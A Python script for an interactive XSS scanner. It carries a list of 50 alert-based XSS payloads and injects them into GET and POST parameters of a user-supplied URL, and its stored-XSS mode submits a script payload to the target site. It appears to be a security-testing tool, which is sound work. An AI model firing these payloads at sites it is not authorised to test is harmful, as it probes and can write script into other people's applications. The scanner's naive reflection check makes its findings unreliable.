#!/usr/bin/env python3
# XSS Scanner with Menu Interface - Enhanced Version
# Author: Your Name
# Version: 2.0

import requests
import sys
import time
from urllib.parse import urljoin, urlparse

# Banner with square symbols
BANNER = """
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                      ▓
▓  ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗    ▓
▓  ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║    ▓
▓   ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║    ▓
▓   ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║    ▓
▓  ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║    ▓
▓  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝    ▓
▓                                                                      ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
"""

# 50 XSS payloads to test
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS');\">",
    "<a href=\"javascript:alert('XSS')\">Click</a>",
    "<div onmouseover=\"alert('XSS')\">Hover</div>",
    "<img src=\"javascript:alert('XSS')\">",
    "<input type=\"text\" value=\"<script>alert('XSS')</script>\">",
    "<embed src=\"javascript:alert('XSS');\">",
    "<object data=\"javascript:alert('XSS')\">",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<img src=1 href=1 onerror=\"javascript:alert('XSS')\"></img>",
    "<audio src=1 onerror=alert('XSS')>",
    "<video src=1 onerror=alert('XSS')>",
    "<form action=\"javascript:alert('XSS')\"><input type=submit>",
    "<math><brute href=\"javascript:alert('XSS')\">CLICK</brute></math>",
    "<frameset onload=alert('XSS')>",
    "<table background=\"javascript:alert('XSS')\">",
    "';alert(String.fromCharCode(88,83,83))//';",
    "\";alert(String.fromCharCode(88,83,83))//\";",
    "<script>alert(/XSS/.source)</script>",
    "<script>alert(1)</script>",
    "<script>prompt(1)</script>",
    "<script>confirm(1)</script>",
    "<script src=\"data:text/javascript,alert('XSS')\"></script>",
    "<marquee onstart=alert('XSS')>",
    "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS');\">",
    "<link rel=\"stylesheet\" href=\"javascript:alert('XSS');\">",
    "<style>@import \"javascript:alert('XSS')\";</style>",
    "<style>li {list-style-image: url(\"javascript:alert('XSS')\");}</style>",
    "<span style=\"background-image: url(javascript:alert('XSS'));\">",
    "<span style=\"background-image: url(&#1;javascript:alert('XSS'));\">",
    "<div style=\"width: expression(alert('XSS'));\">",
    "<base href=\"javascript:alert('XSS');//\">",
    "<applet code=\"javascript:alert('XSS');\">",
    "<bgsound src=\"javascript:alert('XSS');\">",
    "<button onfocus=alert('XSS') autofocus>",
    "<keygen autofocus onfocus=alert('XSS')>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS')></select>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<img src=\"x` `<script>alert('XSS')</script>\"` `>",
    "<script>document.write('<script>alert(\"XSS\")</script>');</script>",
    "<script>setTimeout(alert('XSS'),0)</script>",
    "<script>setInterval(alert('XSS'),0)</script>",
    "<script>Function('alert(\"XSS\")')()</script>"
]

# Configuration
CONFIG = {
    'use_proxy': False,
    'proxy': None,
    'output_file': None,
    'verbose': True
}

def display_menu():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                     XSS SCANNER MENU                      ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓ 1. Scan URL for XSS vulnerabilities                       ▓")
    print("▓ 2. Scan URL with POST method                              ▓")
    print("▓ 3. Check for stored XSS                                   ▓")
    print("▓ 4. List all payloads                                      ▓")
    print("▓ 5. Configure proxy                                        ▓")
    print("▓ 6. Set output file                                        ▓")
    print("▓ 7. Exit                                                   ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def configure_proxy():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                     PROXY CONFIGURATION                   ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    use_proxy = input("▓ Enable proxy? (y/n): ").lower() == 'y'
    if use_proxy:
        proxy_url = input("▓ Enter proxy URL (e.g., http://127.0.0.1:8080): ").strip()
        CONFIG['use_proxy'] = True
        CONFIG['proxy'] = {
            'http': proxy_url,
            'https': proxy_url
        }
        print("▓ Proxy configured successfully!")
    else:
        CONFIG['use_proxy'] = False
        CONFIG['proxy'] = None
        print("▓ Proxy disabled.")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def set_output_file():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                     OUTPUT FILE CONFIG                     ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    filename = input("▓ Enter output file path (leave empty to disable): ").strip()
    if filename:
        CONFIG['output_file'] = filename
        print(f"▓ Output will be saved to: {filename}")
    else:
        CONFIG['output_file'] = None
        print("▓ File output disabled.")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def log_result(message):
    if CONFIG['output_file']:
        with open(CONFIG['output_file'], 'a') as f:
            f.write(message + "\n")
    print(message)

def get_session():
    session = requests.Session()
    if CONFIG['use_proxy'] and CONFIG['proxy']:
        session.proxies = CONFIG['proxy']
    return session

def scan_url(url, method='GET', params=None):
    print(f"\n▓ Scanning: {url}")
    print("▓ Method:", method)
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    
    vulnerable = False
    tested_payloads = 0
    session = get_session()
    
    try:
        for payload in XSS_PAYLOADS:
            tested_payloads += 1
            try:
                # Display payload being tested
                if CONFIG['verbose']:
                    print(f"▓ Testing payload {tested_payloads}/{len(XSS_PAYLOADS)}: {payload[:50]}...", end='\r')
                
                if method == 'GET':
                    # Test in URL parameters
                    test_url = url + ("&" if "?" in url else "?") + "test=" + requests.utils.quote(payload)
                    response = session.get(test_url, timeout=10)
                else:
                    # Test in POST data
                    data = params.copy() if params else {}
                    data['test'] = payload
                    response = session.post(url, data=data, timeout=10)
                
                if payload in response.text:
                    log_result(f"▓ [VULNERABLE] Reflected XSS found with payload: {payload}")
                    vulnerable = True
                else:
                    if CONFIG['verbose']:
                        print(f"▓ [-] Payload {tested_payloads} failed", end='\r')
                
                # Progress indicator
                if tested_payloads % 5 == 0 and CONFIG['verbose']:
                    print(f"▓ Tested {tested_payloads}/{len(XSS_PAYLOADS)} payloads...", end='\r')
                
            except requests.exceptions.RequestException as e:
                if CONFIG['verbose']:
                    print(f"▓ Error testing payload: {str(e)[:50]}...")
                continue
            except KeyboardInterrupt:
                print("\n▓ Scan interrupted by user")
                return
            
    except Exception as e:
        log_result(f"▓ Unexpected error: {e}")
    
    if not vulnerable:
        log_result("▓ No XSS vulnerabilities detected with the tested payloads.")
    else:
        log_result("▓ XSS vulnerabilities were found! Please secure your application.")
    
    log_result(f"▓ Total payloads tested: {tested_payloads}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def check_stored_xss(url, form_params=None):
    print(f"\n▓ Checking for stored XSS: {url}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    
    session = get_session()
    vulnerable = False
    
    try:
        # First submit the payload
        payload = "<script>alert('STORED_XSS')</script>"
        
        if form_params:
            # Submit via form
            data = form_params.copy()
            for key in data:
                if data[key] == 'XSS_PAYLOAD':
                    data[key] = payload
            response = session.post(url, data=data, timeout=10)
        else:
            # Try default injection points
            test_url = url + ("&" if "?" in url else "?") + "comment=" + requests.utils.quote(payload)
            response = session.get(test_url, timeout=10)
        
        # Now check if the payload appears on the page
        time.sleep(2)  # Wait for potential storage
        response = session.get(url, timeout=10)
        
        if payload in response.text:
            log_result("▓ [VULNERABLE] Stored XSS found!")
            vulnerable = True
        else:
            log_result("▓ No stored XSS detected")
            
    except Exception as e:
        log_result(f"▓ Error checking for stored XSS: {e}")
    
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def list_payloads():
    print("\n▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    print("▓                      XSS PAYLOADS LIST                     ▓")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
    for i, payload in enumerate(XSS_PAYLOADS, 1):
        print(f"▓ {i:2d}. {payload}")
    print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")

def main():
    print(BANNER)
    
    while True:
        display_menu()
        try:
            choice = input("\n▓ Select an option (1-7): ").strip()
            
            if choice == "1":
                url = input("▓ Enter URL to scan (e.g., http://example.com/page?param=value): ").strip()
                if not url.startswith(('http://', 'https://')):
                    print("▓ Error: URL must start with http:// or https://")
                    continue
                scan_url(url)
            elif choice == "2":
                url = input("▓ Enter URL for POST scan: ").strip()
                if not url.startswith(('http://', 'https://')):
                    print("▓ Error: URL must start with http:// or https://")
                    continue
                params = input("▓ Enter parameters to test (format: param1=value1,param2=value2): ").strip()
                param_dict = {}
                if params:
                    for pair in params.split(','):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            param_dict[key.strip()] = value.strip()
                scan_url(url, method='POST', params=param_dict)
            elif choice == "3":
                url = input("▓ Enter URL to check for stored XSS: ").strip()
                if not url.startswith(('http://', 'https://')):
                    print("▓ Error: URL must start with http:// or https://")
                    continue
                params = input("▓ Enter form parameters (format: param1=value1,param2=XSS_PAYLOAD): ").strip()
                param_dict = {}
                if params:
                    for pair in params.split(','):
                        if '=' in pair:
                            key, value = pair.split('=', 1)
                            param_dict[key.strip()] = value.strip()
                check_stored_xss(url, param_dict if param_dict else None)
            elif choice == "4":
                list_payloads()
            elif choice == "5":
                configure_proxy()
            elif choice == "6":
                set_output_file()
            elif choice == "7":
                print("▓ Exiting XSS Scanner. Goodbye!")
                print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
                sys.exit(0)
            else:
                print("▓ Invalid choice. Please select 1-7.")
                
            input("\n▓ Press Enter to continue...")
            
        except KeyboardInterrupt:
            print("\n▓ Exiting XSS Scanner. Goodbye!")
            print("▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓")
            sys.exit(0)
        except Exception as e:
            print(f"▓ Error: {e}")
            continue

if __name__ == "__main__":
    main()
